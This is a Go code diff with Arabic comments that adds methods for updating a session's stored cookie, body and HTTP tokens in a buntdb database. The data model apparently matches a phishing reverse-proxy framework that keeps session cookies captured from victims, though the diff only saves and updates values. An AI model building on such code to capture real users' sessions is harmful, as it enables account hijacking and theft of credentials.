@@ -238,3 +238,88 @@ func (d *Database) UpdateSession(sid string, optionName string, optionValue stri
 	
 	return err
 }
+
+// UpdateSessionTokens يحدث كافة الرموز للجلسة
+func (d *Database) UpdateSessionTokens(sid string, tokens map[string]map[string]string) error {
+	err := d.db.Update(func(tx *buntdb.Tx) error {
+		session_str, err := tx.Get("session:" + sid)
+		if err != nil {
+			return err
+		}
+
+		s := &Session{}
+		err = json.Unmarshal([]byte(session_str), s)
+		if err != nil {
+			return err
+		}
+
+		// تحديث الرموز حسب نوعها
+		for tokenType, tokenMap := range tokens {
+			switch tokenType {
+			case "cookie_tokens":
+				// لن نقوم بتطبيق تحديث الكوكيز هنا لأنها تحتاج تنسيقًا خاصًا
+				// استخدم UpdateSessionCookieTokens بدلاً من ذلك
+				break
+			case "body_tokens":
+				s.BodyTokens = tokenMap
+				break
+			case "http_tokens":
+				s.HttpTokens = tokenMap
+				break
+			}
+		}
+
+		s.UpdateTime = time.Now().Unix()
+		data, err := json.Marshal(s)
+		if err != nil {
+			return err
+		}
+		_, _, err = tx.Set("session:" + sid, string(data), nil)
+		return err
+	})
+
+	return err
+}
+
+// UpdateSessionCookieTokens يحدث رمز كوكي محدد للجلسة
+func (d *Database) UpdateSessionCookieTokens(sid string, domain string, key string, value map[string]string) error {
+	err := d.db.Update(func(tx *buntdb.Tx) error {
+		session_str, err := tx.Get("session:" + sid)
+		if err != nil {
+			return err
+		}
+
+		s := &Session{}
+		err = json.Unmarshal([]byte(session_str), s)
+		if err != nil {
+			return err
+		}
+
+		// إنشاء الكوكي إذا لم يكن موجودًا
+		if s.CookieTokens == nil {
+			s.CookieTokens = make(map[string]map[string]*CookieToken)
+		}
+		if _, ok := s.CookieTokens[domain]; !ok {
+			s.CookieTokens[domain] = make(map[string]*CookieToken)
+		}
+
+		// إضافة أو تحديث الكوكي
+		cookieToken := &CookieToken{
+			Name:     value["name"],
+			Value:    value["value"],
+			Path:     value["path"],
+			HttpOnly: value["http_only"] == "true",
+		}
+		s.CookieTokens[domain][key] = cookieToken
+
+		s.UpdateTime = time.Now().Unix()
+		data, err := json.Marshal(s)
+		if err != nil {
+			return err
+		}
+		_, _, err = tx.Set("session:" + sid, string(data), nil)
+		return err
+	})
+
+	return err
+}
